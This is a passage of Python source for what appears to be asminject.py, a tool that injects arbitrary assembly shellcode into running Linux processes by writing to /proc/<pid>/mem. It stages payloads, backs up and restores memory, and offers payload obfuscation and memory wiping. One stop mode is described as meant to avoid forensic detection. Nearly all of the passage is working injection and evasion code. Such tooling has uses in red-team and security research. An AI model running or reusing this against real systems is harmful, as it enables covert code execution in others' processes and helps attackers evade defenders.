                            log_error(f"Couldn't backup existing code from '{mem_file_path}', address {hex(code_backup_address)}, length {hex(len(stage1))}: {e}", ansi=injection_params.ansi)
                            continue_executing = False
                        
                        # back up the data at the communication address
                        try:
                            mem.seek(injection_params.initial_communication_address)
                            communication_address_backup = mem.read(injection_params.communication_address_backup_size)
                            output_memory_block_data(injection_params, f"Communication address backup ({hex(injection_params.initial_communication_address)})", communication_address_backup)
                        except Exception as e:
                            log_error(f"Couldn't backup data at communications address from '{mem_file_path}', address {hex(injection_params.initial_communication_address)}, length {hex(injection_params.communication_address_backup_size)}: {e}", ansi=injection_params.ansi)
                            continue_executing = False
                            
                        # Set the "memory restored" state variable to match the first 4 bytes of the backed up communications address data
                        #injection_params.state_variables.state_map["memory_restored"] = struct.unpack('I', communication_address_backup[0:4])[0]
                        #log(f"Will specify {hex(injection_params.state_variables.state_map["stage_two_written"])} @ {hex(injection_params.initial_communication_address)} as the 'memory restored' value", ansi=injection_params.ansi)
                        log(f"Using: {hex(injection_params.state_variables.state_map['ready_for_memory_restore'])} for 'ready for memory restore' state value", ansi=injection_params.ansi)

                        # write the primary shellcode
                        try:
                            mem.seek(injection_params.saved_instruction_pointer_value)
                            mem.write(stage1)
                        except Exception as e:
                            log_error(f"Couldn't write the stage 1 payload to '{mem_file_path}', address {hex(injection_params.saved_instruction_pointer_value)}: {e}", ansi=injection_params.ansi)
                            continue_executing = False
                except Exception as e:
                    log_error(f"Couldn't read '{mem_file_path}': {e}", ansi=injection_params.ansi)
                    continue_executing = False

                if continue_executing:
                    log(f"Wrote first stage shellcode at {hex(injection_params.saved_instruction_pointer_value)} in target process {injection_params.pid}", ansi=injection_params.ansi)

        if injection_params.pause_before_resume:
            input("Press Enter to resume the target process")

        if injection_params.stop_method == "sigstop":
            log("Continuing process", ansi=injection_params.ansi)
            os.kill(injection_params.pid, signal.SIGCONT)
        elif injection_params.stop_method == "cgroup_freeze":
            log("Thawing process", ansi=injection_params.ansi)
            with open(injection_params.freeze_dir + "/freezer.state", "w") as state_file:
                state_file.write("THAWED\n")

            # put the task back in the root cgroup
            with open("/sys/fs/cgroup/freezer/tasks", "w") as task_file:
                task_file.write(str(injection_params.pid))

            # cleanup
            os.rmdir(injection_params.freeze_dir)
        elif injection_params.stop_method == "slow":
            log("Returning to normal time", ansi=injection_params.ansi)
            try:
                injection_params.set_dynamic_process_info_vars()
                output_process_priority_and_affinity(injection_params, "Post-injection")
                set_process_priority_and_affinity(injection_params, injection_params.asminject_priority_original, injection_params.target_priority_original, injection_params.target_affinity_original, injection_params.asminject_affinity_original)
                injection_params.set_dynamic_process_info_vars()
                output_process_priority_and_affinity(injection_params, "Restored")
            except Exception as e:
                log_error(f"Couldn't set process information to revert from 'slow' mode: {e}", ansi=injection_params.ansi)
                sys.exit(1)

        if continue_executing:
            stage2 = None
            if not injection_params.existing_read_write_address:
                log(f"Waiting for stage 1 to indicate that it is ready to switch to a new communication address", ansi=injection_params.ansi)
                current_state = wait_for_payload_communication_state(injection_params, injection_params.pid, injection_params.get_base_communication_address(), injection_params.state_variables.state_map["switch_to_new_communication_address"])
            if injection_params.existing_read_execute_address:
                log_success(f"Existing read/execute base address: {hex(injection_params.read_execute_region_address)}", ansi=injection_params.ansi)
            else:
                injection_params.read_execute_region_address = current_state.read_execute_address
                log_success(f"New read/execute base address: {hex(injection_params.read_execute_region_address)}", ansi=injection_params.ansi)
            if injection_params.existing_read_write_address:
                log_success(f"Existing read/write base address: {hex(injection_params.read_write_region_address)}", ansi=injection_params.ansi)
            else:
                injection_params.read_write_region_address = current_state.read_write_address
                log_success(f"New read/write base address: {hex(injection_params.read_write_region_address)}", ansi=injection_params.ansi)
            
            log_success(f"New communication address: {hex(injection_params.get_base_communication_address())}", ansi=injection_params.ansi) 
            
            log(f"Waiting for stage 1 to indicate that it has allocated additional memory and is ready for the script to write stage 2", ansi=injection_params.ansi)
            current_state = wait_for_payload_communication_state(injection_params, injection_params.pid, injection_params.get_base_communication_address(), injection_params.state_variables.state_map["ready_for_stage_two_write"])
            
            # restore the data at the original communication address now that communication has migrated\
            log(f"Restoring data at original communications address {hex(injection_params.initial_communication_address)}", ansi=injection_params.ansi)
            #with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
            with open(f"/proc/{injection_params.pid}/mem", "rb+") as mem:
                mem.seek(injection_params.initial_communication_address)
                mem.write(communication_address_backup)
                
                mem.seek(injection_params.initial_communication_address)
                current_communication_address_backup = mem.read(injection_params.communication_address_backup_size)
                output_memory_block_data(injection_params, f"Communication address location after memory restore ({hex(injection_params.initial_communication_address)})", current_communication_address_backup)
            
            injection_params.code_backup_length = len(code_backup)

            stage2_replacements = injection_params.get_replacement_variable_map()

            if injection_params.existing_stage_2_source:
                try:
                    with open(injection_params.existing_stage_2_source, "r") as existing_code_file:
                        stage2_source_code = existing_code_file.read()
                except Exception as e:
                    log_error(f"Couldn't read the existing stage 2 source code file '{injection_params.existing_stage_2_source}': {e}", ansi=injection_params.ansi)
                    sys.exit(1)

            stage2 = assemble(stage2_source_code, injection_params, memory_map_data, "-stage_2", replacements=stage2_replacements)
                
            if not stage2:
                continue_executing = False
            else:
                log(f"Writing stage 2 to {hex(injection_params.read_execute_region_address)} in target memory", ansi=injection_params.ansi)
                # write stage 2
                #with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
                with open(f"/proc/{injection_params.pid}/mem", "rb+") as mem:
                    mem.seek(injection_params.read_execute_region_address)
                    mem.write(stage2)
                    
                if injection_params.pause_before_launching_stage2:
                    input("Press Enter to proceed with launching stage 2")

                # with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
                    # # Give stage 1 the OK to proceed
                    # log(f"Writing {hex(injection_params.state_variables.state_map["stage_two_written"])} to {hex(injection_params.get_base_communication_address())} in target memory to indicate stage 2 has been written to memory", ansi=injection_params.ansi)
                    # mem.seek(injection_params.get_base_communication_address())
                    # ok_val = struct.pack('I', injection_params.state_variables.state_map["stage_two_written"])
                    # mem.write(ok_val)
                    # log_success("Stage 2 proceeding", ansi=injection_params.ansi)
                set_script_communication_state(injection_params, injection_params.pid, injection_params.get_base_communication_address(), injection_params.state_variables.state_map["stage_two_written"])
                log_success("Payload has been instructed to launch stage 2", ansi=injection_params.ansi)
                
                if injection_params.restore_delay > 0.0:
                    log(f"Waiting {injection_params.restore_delay} second(s) before starting memory restore check", ansi=injection_params.ansi)
                    time.sleep(injection_params.restore_delay)
                log(f"Waiting for stage 2 to indicate that it is ready for process memory to be restored", ansi=injection_params.ansi)
                current_state = wait_for_payload_communication_state(injection_params, injection_params.pid, injection_params.get_base_communication_address(), injection_params.state_variables.state_map["ready_for_memory_restore"])
                if injection_params.pause_before_memory_restore:
                    input("Press Enter to proceed with memory restoration")
                log("Restoring original memory content", ansi=injection_params.ansi)
                
                #with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
                with open(f"/proc/{injection_params.pid}/mem", "rb+") as mem:
                    mem.seek(code_backup_address)
                    mem.write(code_backup)

                    # stack restore
                    #mem.seek(stack_backup_address)
                    #current_stack_backup = mem.read(injection_params.stack_backup_size)
                    #output_memory_block_data(injection_params, f"Stack backup location after shellcode execution ({hex(stack_backup_address)})", current_stack_backup)

                    #mem.seek(stack_backup_address)
                    #mem.write(stack_backup)
                    
                    #mem.seek(stack_backup_address)
                    #current_stack_backup = mem.read(injection_params.stack_backup_size)
                    #output_memory_block_data(injection_params, f"Stack backup location after memory restore ({hex(stack_backup_address)})", current_stack_backup)
                    
                    # communication address restore
                    
                    mem.seek(injection_params.initial_communication_address)
                    current_communication_address_backup = mem.read(injection_params.communication_address_backup_size)
                    output_memory_block_data(injection_params, f"Communication address location after shellcode execution ({hex(injection_params.initial_communication_address)})", current_communication_address_backup)

                if injection_params.pause_after_memory_restore:
                    input("Press Enter to allow the inner payload to execute")

                # with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
                    # mem.seek(injection_params.get_base_communication_address())
                    # ok_val = struct.pack('I', injection_params.state_variables.state_map["memory_restored"])
                    # mem.write(ok_val)
                set_script_communication_state(injection_params, injection_params.pid, injection_params.get_base_communication_address(), injection_params.state_variables.state_map["memory_restored"])

                if injection_params.enable_debugging_output:
                    memory_region_backup_comparison = back_up_memory_regions(injection_params, memory_map_data, injection_params.memory_region_backup_subdirectory_name + "-post_injection_comparison")
                    log(f"Created a post-injection memory region backup in '{memory_region_backup_comparison.backup_directory}' for debugging purposes", ansi=injection_params.ansi)
                    
                restore_memory_regions(injection_params, memory_region_backup)
                
                if injection_params.enable_debugging_output:
                    memory_region_backup_comparison = back_up_memory_regions(injection_params, memory_map_data, injection_params.memory_region_backup_subdirectory_name + "-post_restore_comparison")
                    log(f"Created a post-restore memory region backup in '{memory_region_backup_comparison.backup_directory}' for debugging purposes", ansi=injection_params.ansi)
                
                log(f"Waiting for payload to indicate that it is ready for cleanup", ansi=injection_params.ansi)
                current_state = wait_for_payload_communication_state(injection_params, injection_params.pid, injection_params.get_base_communication_address(), injection_params.state_variables.state_map["payload_ready_for_script_cleanup"])

                overwrite_ring_buffer = bytearray(struct.pack(injection_params.register_size_format_string, injection_params.clear_payload_memory_value))
                if injection_params.clear_payload_memory_after_execution:
                    if injection_params.clear_payload_memory_delay > 0.0:
                        log(f"Waiting {injection_params.clear_payload_memory_delay} second(s) before clearing payload read/write memory", ansi=injection_params.ansi)
                        time.sleep(injection_params.clear_payload_memory_delay)
                    target_address = injection_params.read_write_region_address + injection_params.rwr_cpu_state_backup_offset
                    overwrite_length = injection_params.read_write_region_size - injection_params.rwr_cpu_state_backup_offset
                    #target_address = injection_params.read_write_region_address
                    #overwrite_length = injection_params.read_write_region_size
                    overwrite_bytes = bytearray(get_ring_populated_array(overwrite_length, overwrite_ring_buffer))
                    log(f"Overwriting payload read/write block starting at CPU state backup address ({hex(target_address)}) in target process memory with {hex(len(overwrite_bytes))} bytes", ansi=injection_params.ansi)
                    try:
                        with open(f"/proc/{injection_params.pid}/mem", "rb+") as mem:
                            mem.seek(target_address)
                            mem.write(overwrite_bytes)
                    except Exception as e:
                        log_error(f"Couldn't overwrite read/write memory: {e}", ansi=injection_params.ansi)
                
                log(f"Notifying payload that cleanup is complete", ansi=injection_params.ansi)
                set_script_communication_state(injection_params, injection_params.pid, injection_params.get_base_communication_address(), injection_params.state_variables.state_map["script_cleanup_complete"])

                # can only clear r/x memory after the payload has exited
                if injection_params.clear_payload_memory_after_execution:
                    if injection_params.clear_payload_memory_delay > 0.0:
                        log(f"Waiting {injection_params.clear_payload_memory_delay} second(s) before clearing payload read/execute memory", ansi=injection_params.ansi)
                        time.sleep(injection_params.clear_payload_memory_delay)
                    overwrite_bytes = bytearray(get_ring_populated_array(injection_params.read_execute_region_size, overwrite_ring_buffer))
                    log(f"Overwriting payload read/execute block ({hex(injection_params.read_execute_region_address)}) in target process memory with {hex(len(overwrite_bytes))} bytes", ansi=injection_params.ansi)
                    try:
                        with open(f"/proc/{injection_params.pid}/mem", "rb+") as mem:
                            mem.seek(injection_params.read_execute_region_address)
                            mem.write(overwrite_bytes)
                    except Exception as e:
                        log_error(f"Couldn't overwrite read/execute memory: {e}", ansi=injection_params.ansi)
                        
    except KeyboardInterrupt as ki:
        log_warning(f"Operator cancelled the injection attempt", ansi=injection_params.ansi)
        continue_executing = False
    
    log(f"Finished at {injection_params.get_timestamp_string()} (UTC)", ansi=injection_params.ansi)
    if injection_params.delete_temp_files:
        log(f"Deleting the temporary directory '{injection_params.temp_file_base_directory}' and all of its contents", ansi=injection_params.ansi)
        asminject_parameters.delete_directory_tree(injection_params.temp_file_base_directory, injection_params)
    else:
        log(f"The temporary directory '{injection_params.temp_file_base_directory}' has been preserved", ansi=injection_params.ansi)
    
    if not injection_params.deallocate_memory and current_state:
        log_success(f"To reuse the existing read/write and read execute memory allocated during this injection attempt, include the following options in your next asminject.py command: --use-read-execute-address {hex(injection_params.read_execute_region_address)} --use-read-execute-size {hex(injection_params.read_execute_region_size)} --use-read-write-address {hex(injection_params.read_write_region_address)} --use-read-write-size {hex(injection_params.read_write_region_size)}", ansi=injection_params.ansi)

def validate_overwrite_data(injection_params):
    result_temp = struct.pack(injection_params.register_size_format_string, injection_params.clear_payload_memory_value)
    if len(result_temp) > injection_params.register_size:
        log_error("The payload memory overwrite value {hex(injection_params.clear_payload_memory_value)} is too large for the target architecture's CPU width of {injection_params.register_size} bytes", ansi=injection_params.ansi)
        sys.exit(1)

def autodetect_architecture_string(injection_params):
    platform_arch_string = platform.machine().lower()
    autodetected_arch_string = None
    if platform_arch_string in ["amd64", "x86_64"]:
        autodetected_arch_string = "x86-64"
    
    if platform_arch_string in ["i386", "i486", "i586", "i686"]:
        autodetected_arch_string = "x86"
    
    if platform_arch_string in ["armv7l", "armv7"]:
        autodetected_arch_string = "arm32"
    
    if not autodetected_arch_string:
        log_error(f"Did not recognize the processor architecture string '{platform_arch_string}'", ansi=injection_params.ansi)
    
    return autodetected_arch_string

def parse_command_line_numeric_value(v):
    result = None
    if len(v) > 2 and v[0:2].lower() == "0x":
        try:
            result = int(v[2:], 16)
        except Exception as e:
            log_error(f"Couldn't parse '{v}' as a hexadecimal integer: {e}", ansi=injection_params.ansi)
            sys.exit(1)
    else:
        try:
            result = int(v)
        except Exception as e:
            log_error(f"Couldn't parse '{v}' as a decimal integer: {e}", ansi=injection_params.ansi)
            sys.exit(1)
    return result

# begin: https://stackoverflow.com/questions/15008758/parsing-boolean-values-with-argparse
def str2bool(v):
    if isinstance(v, bool):
        return v
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')

# end: https://stackoverflow.com/questions/15008758/parsing-boolean-values-with-argparse

if __name__ == "__main__":
    injection_params = asminject_parameters()

    print(BANNER)

    parser = argparse.ArgumentParser(
        description="Inject arbitrary assembly code into a live process")

    parser.add_argument("pid", metavar="process_id", type=int,
        help="The pid of the target process")

    parser.add_argument("asm_path", metavar="payload_path", type=str,
        help="Path to the assembly code that should be injected")

    parser.add_argument("--relative-offsets", action='append', nargs=2, type=str, required=False,
        help="Library name and path to a list of relative offsets referenced in the assembly code. May be specified multiple times to reference several files. Generate on a per-binary basis using the following command, e.g. for libc-2.31: # ./get_relative_offsets.sh /usr/lib/x86_64-linux-gnu/libc-2.31.so > relative_offsets-libc-2.31.txt; Reference when calling asminject.py using e.g. --relative-offsets /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so")

    parser.add_argument("--relative-offsets-from-binaries",type=str2bool, nargs='?',
        const=True, default=False,
        help="Read relative offsets from the binaries referred to in /proc/<pid>/maps instead of a text file. This will *only* work if the target process is not running in a container, or if the container has the exact same executable and library versions as the host or container where asminject.py is running. Requires that the elftools Python library be installed on the system where asminject.py is running.")
    
    parser.add_argument("--non-pic-binary", action='append', nargs='*', required=False,
        help="Regular expression identifying one or more executables/libraries that do *not* use position-independent code, such as Python 3.x. May be specified multiple times.")

    parser.add_argument("--restore-memory-region", action='append', nargs='*', required=False,
        help=f"Regular expression identifying one or more regions of memory to perform a full backup of before injecting code, and restore after the payload has executed. May be specified multiple times.")

    parser.add_argument("--restore-all-memory-regions", type=str2bool, nargs='?',
        const=True, default=False,
        help="Back up all of the memory mapped by the target process before injecting the payload, and restore all regions that are possible to restore after the payload has completed. Using this option is not recommended due to the volume of data that will be written to disk. If possible, use one or more --restore-memory-region directives to perform a targeted backup restore.")

    parser.add_argument("--stop-method",
        choices=["slow", "sigstop", "cgroup_freeze", "none"],
        default="slow",
        help="How to stop the target process prior to shellcode injection. \
              'sigstop' uses the built-in Linux process suspension mechanism, and can have side-effects. \
              'cgroup_freeze' requires root, and only operates in environments with cgroups.\
              'slow' (default) attempts to avoid forensic detection and side-effects of suspending a process by \
              temporarily setting the priority of the target process to the lowest possible value, \
              and the priority of asminject.py to the highest possible value. \
              'none' leaves the target process running as-is and is likely to cause race conditions.")
    
    # parser.add_argument("--inject-method",
        # choices=["wait-syscall", "overwrite-specific"], default="wait-syscall",
        # help="Code-injection technique to use: wait for a syscall and overwrite the return address (like dlinject.py), or pre-emptively overwrite a specific function \
              # Default: wait-syscall.")
    
    parser.add_argument("--arch",
        #choices=["x86-64", "x86", "arm32", "arm64"], default="x86-64",
        choices=["x86-64", "x86", "arm32"], #, default="x86-64",
        help="Processor architecture for the injected code.")
              #Default: x86-64.")
            
    parser.add_argument("--var",action='append',nargs=2, type=str,
        help="Specify a custom variable for use by the stage 2 code, e.g. --var pythoncode \"print('OK')\". May be specified multiple times for different variables.")
    
    parser.add_argument("--plaintext", type=str2bool, nargs='?',
        const=True, default=False,
        help="Disable ANSI formatting for console output")
    
    parser.add_argument("--pause-before-resume", type=str2bool, nargs='?',
        const=True, default=False,
        help="Prompt for input before resuming/unfreezing the target process")

    parser.add_argument("--pause-before-launching-stage2", type=str2bool, nargs='?',
        const=True, default=False,
        help="Prompt for input before giving the stage 1 payload the go-ahead to launch stage 2")
        
    parser.add_argument("--pause-before-memory-restore", type=str2bool, nargs='?',
        const=True, default=False,
        help="Prompt for input before restoring memory")
    
    parser.add_argument("--pause-after-memory-restore", type=str2bool, nargs='?',
        const=True, default=False,
        help="Prompt for input after restoring memory, but before signalling the shellcode to proceed")
    
    parser.add_argument("--do-not-deallocate", type=str2bool, nargs='?',
        const=True, default=False,
        help="Do not deallocate the read/write data block when the payload finishes (for reuse using --use-read-write-address)")
    
    parser.add_argument("--use-read-execute-address", type=parse_command_line_numeric_value, 
        help="When injecting into a process that's already been injected into, use this existing block of memory for read/execute data instead of allocating a new one")

    parser.add_argument("--use-read-execute-size", type=parse_command_line_numeric_value, 
        help="When injecting into a process that's already been injected into, assume this size for the existing block of read/execute memory")

    parser.add_argument("--use-read-write-address", type=parse_command_line_numeric_value, 
        help="When injecting into a process that's already been injected into, use this existing block of memory for read/write data instead of allocating a new one")

    parser.add_argument("--use-read-write-size", type=parse_command_line_numeric_value, 
        help="When injecting into a process that's already been injected into, assume this size for the existing block of read/write memory")

    parser.add_argument("--precompiled", type=str, 
        help="Path to a precompiled binary shellcode payload to embed and launch (requires use of execute_precompiled.s or execute_precompiled_threaded.s as the stage 2 payload)")

    parser.add_argument("--clear-payload-memory", type=str2bool, nargs='?',
        const=True, default=False,
        help="Set all bytes in the read/execute and read/write memory to 0x00 after the payload has finished executing")

    parser.add_argument("--clear-payload-memory-value", type=parse_command_line_numeric_value, 
        help="When --clear-payload-memory is selected, used the specified value instead of 0x00 to overwrite memory. The value must be a decimal or hexadecimal integer that can be represented using a number of bytes less than or equal to the CPU register width for the architecture, i.e. 32 bits for 32-bit CPUs, 64 bits for 64-bit CPUs")
    
    parser.add_argument("--clear-payload-memory-delay", type=parse_command_line_numeric_value, 
        help=f"When --clear-payload-memory is selected, wait this many seconds after the payload indicates it's finished before clearing read/write memory, and the same number of seconds before clearing read/execute memory. This is to account for multithreaded code spawned by the payload that may still hold a reference to the payload memory. (Default: {injection_params.clear_payload_memory_delay} second(s))")

    parser.add_argument("--obfuscate", type=str2bool, nargs='?',
        const=True, default=False,
        help="Enable code obfuscation")

    parser.add_argument("--per-line-obfuscation-percentage", type=parse_command_line_numeric_value, 
        help="If a given line of payload source is a valid location for obfuscation to be added, use this likelihood (1-100) when determining if the obfuscation *will* be added there")

    parser.add_argument("--obfuscation-iterations", type=parse_command_line_numeric_value, 
        help="Perform the obfuscation routine this many times over each payload")

    parser.add_argument("--temp-dir", type=str, 
        help="Path to use for writing temporary files instead of the default (a dynamically-created directory underneath the default temporary directory for the OS)")

    parser.add_argument("--preserve-temp-files", type=str2bool, nargs='?',
        const=True, default=False,
        help="Do not delete temporary files created during the assembling and linking process")
        
    parser.add_argument("--write-assembly-source-to-disk", type=str2bool, nargs='?',
        const=True, default=False,
        help="When assembling the stage 1 and stage 2 payloads, write them to disk for debugging/analysis")
        
    parser.add_argument("--debug", type=str2bool, nargs='?',
        const=True, default=False,
        help="Enable debugging messages")

    parser.add_argument("--use-stage-1-source", type=str, 
        help="Debugging option for issue reproduction. Path to a pre-existing stage 1 assembly source code file, e.g. the result of adding --write-assembly-source-to-disk and --preserve-temp-files to a previous run of asminject.py. Note that you *must* use the '-post-obfuscation-pre-replacement.s' version of the file or injection will fail.")

    parser.add_argument("--use-stage-2-source", type=str, 
        help="Debugging option for issue reproduction. Path to a pre-existing stage 2 assembly source code file, e.g. the result of adding --write-assembly-source-to-disk and --preserve-temp-files to a previous run of asminject.py. Note that you *must* use the '-post-obfuscation-pre-replacement.s' version of the file or injection will fail.")

        
    args = parser.parse_args()
    
    injection_params.ansi = not args.plaintext
    
    if args.var:
        for var_set in args.var:
            injection_params.custom_replacements[f"[VARIABLE:{var_set[0]}:VARIABLE]"] = var_set[1]
            injection_params.custom_replacements[f"[VARIABLE:{var_set[0]}.length:VARIABLE]"] = str(len(var_set[1]))
    
    # attempt to autodetermine architecture unless explicitly specified
    architecture_string = ""
    detected_architecture_string = autodetect_architecture_string(injection_params)
    
    autodetection_string = ""
    if args.arch:
        architecture_string = args.arch
    else:
        if detected_architecture_string:
            architecture_string = detected_architecture_string
            autodetection_string = "autodetected "
        else:
            log_error(f"Unable to automatically determine the processor architecture - specify an architecture manually using the --arch option", ansi=injection_params.ansi)
            sys.exit(1)

    log(f"Using {autodetection_string}processor architecture '{architecture_string}'")

    injection_params.base_script_path = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
    injection_params.pid = args.pid
    injection_params.set_architecture(architecture_string)
    injection_params.asm_path = os.path.join(injection_params.base_script_path, "asm", injection_params.architecture, args.asm_path)
    injection_params.stop_method = args.stop_method
    injection_params.pause_before_resume = args.pause_before_resume
    injection_params.pause_before_launching_stage2 = args.pause_before_launching_stage2
    injection_params.pause_before_memory_restore = args.pause_before_memory_restore    
    injection_params.pause_after_memory_restore = args.pause_after_memory_restore
    injection_params.enable_debugging_output = args.debug
    
    if args.do_not_deallocate:
        injection_params.deallocate_memory = False
    
    if args.use_read_execute_address:
        injection_params.existing_read_execute_address = args.use_read_execute_address
        if not args.use_read_execute_size:
            log_error("When specifying an existing read/execute address via --use-read-execute-address, an existing size must also be specified using --use-read-execute-size", ansi=injection_params.ansi)
            sys.exit(1)
    
    if args.use_read_execute_size:
        injection_params.read_execute_region_size = args.use_read_execute_size
    
    if args.use_read_write_address:
        injection_params.existing_read_write_address = args.use_read_write_address
        if not args.use_read_write_size:
            log_error("When specifying an existing read/write address via --use-read-write-address, an existing size must also be specified using --use-read-write-size", ansi=injection_params.ansi)
            sys.exit(1)
    
    if args.use_read_write_size:
        injection_params.read_write_region_size = args.use_read_write_size
        injection_params.set_rwr_arbitrary_data_block_values()
    
    if args.preserve_temp_files:
        injection_params.delete_temp_files = False

    if args.write_assembly_source_to_disk:
        injection_params.write_assembly_source_to_disk = True
        if injection_params.delete_temp_files:
            log_warning("Operator specified --write-assembly-source-to-disk, but did not specify --preserve-temp-files, so the assembly source will be deleted when asminject.py exits", ansi=injection_params.ansi)

    if args.precompiled:
        injection_params.precompiled_shellcode = os.path.abspath(args.precompiled)
    
    # readelf -a --wide /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 > offsets-libc-2.31.so.txt
    if args.relative_offsets:
        for relative_offset_set in args.relative_offsets:
            injection_params.custom_replacements[f"[VARIABLE:{relative_offset_set[0]}:VARIABLE]"] = relative_offset_set[1]
            injection_params.custom_replacements[f"[VARIABLE:{relative_offset_set[0]}.length:VARIABLE]"] = str(len(relative_offset_set[1]))
            offsets_binary_name = relative_offset_set[0].strip()
            offsets_path = relative_offset_set[1].strip()
            if offsets_path != "":
                reloff_abs_path = os.path.abspath(offsets_path)
                offset_list = {}
                try:
                    with open(reloff_abs_path) as offsets_file:
                        for line in offsets_file.readlines():
                            line_array = line.strip().split(" ")
                            offset_name = line_array[1].strip()
                            offset_value = int(line_array[0], 16)
                            if offset_value > 0:
                                if offset_name in offset_list.keys():
                                    existing_value = offset_list[offset_name]
                                    log_warning(f"The offset '{offset_name}' is redefined from '{existing_value}' to '{offset_value}' in '{reloff_abs_path}'", ansi=injection_params.ansi)
                                offset_list[offset_name] = offset_value
                            else:
                                if injection_params.enable_debugging_output:
                                    log_warning(f"Ignoring offset '{offset_name}' in '{reloff_abs_path}' because it has a value of zero", ansi=injection_params.ansi)
                except Exception as e:
                    log_error(f"Couldn't load list of relative offsets for '{offsets_binary_name}' from '{reloff_abs_path}': {e}", ansi=injection_params.ansi)
                    sys.exit(1)
            
                injection_params.relative_offsets[offsets_binary_name] = offset_list
    
    if args.relative_offsets_from_binaries:
        injection_params.relative_offsets_from_binaries = True
    
    if not injection_params.relative_offsets_from_binaries and len(injection_params.relative_offsets) < 1:
        log_error("A list of relative offsets was not specified. If the injection fails, check your payload to make sure you're including the offsets of any exported functions it calls.", ansi=injection_params.ansi)
    
    if args.non_pic_binary:
        if len(args.non_pic_binary) > 0:
            for elem in args.non_pic_binary:
                for pb in elem:
                    if pb.strip() != "":
                        if pb not in injection_params.non_pic_binaries:
                            injection_params.non_pic_binaries.append(pb)

    if args.restore_memory_region:
        if len(args.restore_memory_region) > 0:
            for elem in args.restore_memory_region:
                for mr in elem:
                    if mr.strip() != "":
                        if mr not in injection_params.restore_memory_region_regexes:
                            injection_params.restore_memory_region_regexes.append(mr)

    if args.restore_all_memory_regions:
        injection_params.restore_all_memory_regions = True

    if args.temp_dir:
        injection_params.temp_file_base_directory = os.path.abspath(args.temp_dir)

    log(f"Using '{injection_params.temp_file_base_directory}' as the base temporary directory", ansi=injection_params.ansi)

    if args.use_stage_1_source:
        injection_params.existing_stage_1_source = os.path.abspath(args.use_stage_1_source)

    if args.use_stage_2_source:
        injection_params.existing_stage_2_source = os.path.abspath(args.use_stage_2_source)

    if args.obfuscate:
        injection_params.obfuscate_payloads = True

    if args.per_line_obfuscation_percentage:
        injection_params.per_line_obfuscation_percentage = float(args.per_line_obfuscation_percentage) / 100.0
        
    if args.obfuscation_iterations:
        injection_params.obfuscation_iterations = args.obfuscation_iterations

    if args.clear_payload_memory:
        injection_params.clear_payload_memory_after_execution = args.clear_payload_memory

    if args.clear_payload_memory_value:
        injection_params.clear_payload_memory_value = args.clear_payload_memory_value
    
    if args.clear_payload_memory_delay:
        injection_params.clear_payload_memory_delay = float(args.clear_payload_memory_delay)

    validate_overwrite_data(injection_params)

    # Create the temporary directory
    asminject_parameters.make_required_directory(injection_params.temp_file_base_directory, injection_params)

    asminject(injection_params)
